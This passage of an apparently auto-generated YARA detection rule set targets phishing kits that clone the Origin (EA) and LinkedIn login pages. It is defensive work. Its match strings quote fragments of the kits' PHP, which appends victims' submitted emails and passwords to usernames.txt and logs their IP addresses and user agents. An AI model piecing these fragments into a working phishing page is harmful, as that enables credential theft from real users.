      $x1 = "header('Location: https://signin.ea.com/p/originX/login?execution=e1749410853s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fco" ascii /* score: '37.00'*/
      $x2 = "header('Location: https://signin.ea.com/p/originX/login?execution=e1749410853s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fco" ascii /* score: '34.00'*/
      $s3 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['email'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEND);" ascii /* score: '29.00'*/
      $s4 = "%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html');" fullword ascii /* score: '28.00'*/
      $s5 = "nnect%2Fauth%3Fresponse_type%3Dcode%26client_id%3DORIGIN_SPA_ID%26display%3DoriginXWeb%252Flogin%26locale%3Den_US%26redirect_uri" ascii /* score: '14.00'*/
      $s6 = "e1749410853" ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_login_2 {
   meta:
      description = "phish__origin - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "f3b79d384f1921469e98b862be59c526ac112610d5b0dd4f0567750c802f396e"
   strings:
      $s1 = "<!-- ### prdaccountc-01.iad2.infery.com ### -->" fullword ascii /* score: '30.00'*/
      $s2 = "                        <a id=\"forget-password\" href=\"https://signin.ea.com/p/originX/resetPassword?fid=RlMwOjEuMDoyLjA6c1BxZ" ascii /* score: '25.00'*/
      $s3 = "            <a id=\"loginNav\" style=\"display: block;\" href=\"https://signin.ea.com/p/originX/login?fid=RlMwOjEuMDoyLjA6c1BxZn" ascii /* score: '23.00'*/
      $s4 = "            <a id=\"loginNav\" style=\"display: block;\" href=\"https://signin.ea.com/p/originX/login?fid=RlMwOjEuMDoyLjA6c1BxZn" ascii /* score: '23.00'*/
      $s5 = "            page_name : \"https://signin.ea.com/p/originX/login\"" fullword ascii /* score: '23.00'*/
      $s6 = "                        <a id=\"forget-password\" href=\"https://signin.ea.com/p/originX/resetPassword?fid=RlMwOjEuMDoyLjA6c1BxZ" ascii /* score: '21.00'*/
      $s7 = "                <form id=\"check-phone-number-form\" action=\"login.php\" method=\"post\">" fullword ascii /* score: '18.00'*/
      $s8 = "                        <form id=\"login-with-email-form\" action=\"login.php\" method=\"post\">" fullword ascii /* score: '18.00'*/
      $s9 = "                <form id=\"login-form\" method=\"post\" action=\"login.php\">" fullword ascii /* score: '18.00'*/
      $s10 = "                <form id=\"login-with-email-form\" method=\"post\">" fullword ascii /* score: '15.00'*/
      $s11 = "                <a id=\"createNav\" style=\"display: block;\" href=\"https://signin.ea.com/p/originX/create?fid=RlMwOjEuMDoyLjA6" ascii /* score: '15.00'*/
      $s12 = "<script type=\"text/javascript\" async=\"\" charset=\"utf-8\" id=\"utag_ea.originx_344\" src=\"SIGN%20IN_files/utag.js\"></scrip" ascii /* score: '15.00'*/
      $s13 = "o any account. Try <a href=\"#\" id=\"login_with_email\">signing in with your email address</a> instead.</p>" fullword ascii /* score: '14.00'*/
      $s14 = "        $.fn.login({" fullword ascii /* score: '14.00'*/
      $s15 = "                <link rel=\"stylesheet\" type=\"text/css\" href=\"SIGN%20IN_files/originX-pc-login.css\">" fullword ascii /* score: '13.00'*/
      $s16 = "t src=\"SIGN%20IN_files/iframe_api.js\"></script><script src=\"SIGN%20IN_files/analytics.js\"></script><script src=\"SIGN%20IN_f" ascii /* score: '13.00'*/
      $s17 = "TlJkNEVkM25NN3JMM3lKZEdJOm9hNDNl\" class=\"otka otkc\">Forget your password?</a>" fullword ascii /* score: '13.00'*/
      $s18 = "            'contextPath' : \"https://signin.ea.com:443/p\"," fullword ascii /* score: '12.00'*/
      $s19 = "set your password.</p>" fullword ascii /* score: '12.00'*/
      $s20 = "                             <p class=\"otkinput-errormsg otkc otkform-group-help\">The phone number you entered does not belong" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 80KB and
      8 of them
}

rule _opt_mal_phish__origin_home_ubuntu_malware_lab_samples_extracted_phishing_Origin_ip {
   meta:
      description = "phish__origin - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__origin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__linkedin/phish__linkedin_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__linkedin
   Reference: phish__linkedin phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__linkedin_home_ubuntu_malware_lab_samples_extracted_phishing_LinkedIn_index {
   meta:
      description = "phish__linkedin - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__linkedin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__linkedin_home_ubuntu_malware_lab_samples_extracted_phishing_LinkedIn_login {
   meta:
      description = "phish__linkedin - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__linkedin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "3ce37eec6052179a90f6def84f58ca14300e4f3e864ec75a4406f00c9c599786"
   strings:
      $x1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['session_key'] . \" Pass: \" . $_POST['session_password'] . \"\\n\"," ascii /* score: '32.00'*/
      $x2 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['session_key'] . \" Pass: \" . $_POST['session_password'] . \"\\n\"," ascii /* score: '32.00'*/
      $s3 = "header('Location: https://linkedin.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__linkedin_home_ubuntu_malware_lab_samples_extracted_phishing_LinkedIn_login_2 {
   meta:
      description = "phish__linkedin - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__linkedin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "ea9ff92d82654c353aa8f241dadfd68e698907f37d7415bc6bd0cebde4f201ad"
   strings:
      $x1 = "</button></li></ul><input type=\"hidden\" name=\"i18nLang\" value=\"\"><input type=\"hidden\" name=\"currenturl\" value=\"\"></f" ascii /* score: '45.00'*/
      $x2 = "s you, enter your Email and password here to sign in.</div></div><a title=\"Close\" href=\"#\" class=\"hopscotch-bubble-close ho" ascii /* score: '42.00'*/
      $x3 = "        <div class=\"global-wrapper artdeco-a\"><code id=\"i18n_sign_in\" style=\"display: none;\"><!--\"Sign in\"--></code><cod" ascii /* score: '37.00'*/
      $x4 = "inkedin.com/\",\"potentialAction\": {\"@type\": \"SearchAction\",\"target\": \"https://www.linkedin.com/vsearch/f?type=all&keywo" ascii /* score: '33.00'*/
      $s5 = "<a target=\\\"_blank\\\" href=\\\"https:\\/\\/www.linkedin.com\\/help\\/linkedin\\/answer\\/4135?lang=en\\\">Learn more about br" ascii /* score: '29.00'*/
      $s6 = " RUM.base_urls['permanent_content'] = \"https:\\/\\/static.licdn.com\\/scds\\/common\\/u\\/\";" fullword ascii /* score: '28.00'*/
      $s7 = "<!--[if IE 8]><script src=\"https://static.licdn.com/scds/common/u/lib/polyfill/1.0.2/ie8-polyfill.min.js\"></script><![endif]--" ascii /* score: '28.00'*/
      $s8 = "Url\":\"https://media.licdn.com/media-proxy\"}--></code><script src=\"https://static.licdn.com/sc/h/19dd5wwuyhbk7uttxpuelttdg\">" ascii /* score: '28.00'*/
      $s9 = "<!--[if IE 9]><script src=\"https://static.licdn.com/scds/common/u/lib/polyfill/1.0.2/ie9-polyfill.min.js\"></script><![endif]--" ascii /* score: '28.00'*/
      $s10 = "                            r['global_browser_unsupported_notice'] = 'Looks like you\\'re using a browser that\\'s not supported" ascii /* score: '27.00'*/
      $s11 = "        <link rel=\"stylesheet\" href=\"https://static.licdn.com/sc/h/8nfuf4ujwbho8clwe5964984y\"/><meta name=\"description\" co" ascii /* score: '26.00'*/
      $s12 = "-password\" tabindex=\"1\" href=\"https://www.linkedin.com/uas/request-password-reset?trk=uno-reg-guest-home-forgot-password\">F" ascii /* score: '25.00'*/
      $s13 = "nd-static-content%2B0.1.326/f\",\"csrfToken\":\"ajax:0054295001501331025\",\"intlPolyfillUrl\":\"https://static.licdn.com/sc/h/1" ascii /* score: '25.00'*/
      $s14 = "        <script src=\"https://static.licdn.com/sc/h/3jue9p5yu1z9ypds9u1xcrb7u,27ftp26z6dvrdcg640xdatntb,edz16jejjqcx42fe0m2ca4nx" ascii /* score: '25.00'*/
      $s15 = "data-delayed-url=\"https://static.licdn.com/sc/h/95o6rrc5ws6mlw6wqzy0xgj7y\" alt=\"LinkedIn\"/></h1><form class=\"login-form\" a" ascii /* score: '24.00'*/
      $s16 = " RUM.base_urls['versioned_content'] = \"https:\\/\\/static.licdn.com\\/scds\\/concat\\/common\\/\";" fullword ascii /* score: '24.00'*/
      $s17 = "575y2ma1e5ky\"></script><code id=\"__pageContext__\" style=\"display: none;\"><!--{\"baseScdsUrl\":\"https://static.licdn.com/sc" ascii /* score: '23.00'*/
      $s18 = " RUM.base_urls['media_proxy'] = \"https:\\/\\/media.licdn.com\\/media-proxy\\/\";" fullword ascii /* score: '23.00'*/
      $s19 = "<meta name=\"msapplication-TileImage\" content=\"https://static.licdn.com/scds/common/u/images/logos/linkedin/logo-in-win8-tile-" ascii /* score: '23.00'*/
      $s20 = "static.licdn.com/scds/common/u/lib/fizzy/fz-1.3.3-min.js\",\"mpName\":\"seo-directory-frontend\",\"scHashesUrl\":\"https://stati" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__linkedin_home_ubuntu_malware_lab_samples_extracted_phishing_LinkedIn_ip {
   meta:
      description = "phish__linkedin - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__linkedin phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s10 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



